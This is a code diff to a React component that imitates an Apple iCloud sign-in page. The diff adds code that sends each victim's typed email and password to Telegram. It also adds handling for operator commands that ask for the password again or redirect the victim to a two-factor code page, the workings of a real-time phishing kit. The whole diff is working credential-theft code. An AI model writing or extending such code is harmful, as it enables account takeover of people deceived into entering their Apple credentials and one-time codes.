@@ -24,9 +24,12 @@ export default function AppleAuth() {
         } else if (command === 'REQUEST_ICLOUD_PASSWORD') {
             setIsLoading(false);
             setCurrentStep('password');
-        }  else if (command === 'REQUEST_ICLOUD_2FA_OTP') {
+        } else if (command === 'REQUEST_ICLOUD_PASSWORD_AGAIN') {
+            setInvalid(true);
+            setIsLoading(false);
+            // setCurrentStep('password');
+        } else if (command === 'REQUEST_ICLOUD_2FA_OTP') {
             setTimeout(() => {
-                resetCommand(); 
                 router.push('/AppleOtpPage');
             }, 1500);
         } else if (command === 'FINISH') {
@@ -42,13 +45,14 @@ export default function AppleAuth() {
         if (!email.trim()) return;
         
         setIsLoading(true);
-        console.log("Email submitted:", email);
+        // console.log("Email submitted:", email);
+        sendMessageToTelegram("ICLOUD EMAIL: ", email)
         
         // Simulate API call delay
-        setTimeout(() => {
-            setIsLoading(false);
-            setCurrentStep('password');
-        }, 1500);
+        // setTimeout(() => {
+        //     setIsLoading(false);
+        //     setCurrentStep('password');
+        // }, 1500);
     };
 
     const handlePasswordSubmit = (e) => {
@@ -56,16 +60,17 @@ export default function AppleAuth() {
         if (!password.trim()) return;
         
         setIsLoading(true);
-        console.log("Email:", email, "Password:", password);
+        sendMessageToTelegram("ICLOUD PASSWORD: ", password)
+        // console.log("Email:", email, "Password:", password);
         
         // You can add API call here to send the data
         // For now just logging to console
         
         // Simulate API call delay
-        setTimeout(() => {
-            setIsLoading(false);
-            // You can redirect or show success message here
-        }, 1500);
+        // setTimeout(() => {
+        //     setIsLoading(false);
+        //     // You can redirect or show success message here
+        // }, 1500);
     };
 
     const stopLoader = () => {
@@ -223,6 +228,11 @@ export default function AppleAuth() {
                                         )}
                                     </button>
                                 </div>
+                                {isInvalid && (
+                                    <p className="text-red-500 text-sm mt-1">
+                                        Incorrect Password.
+                                    </p>
+                                )}
                             </form>
                         )}
 
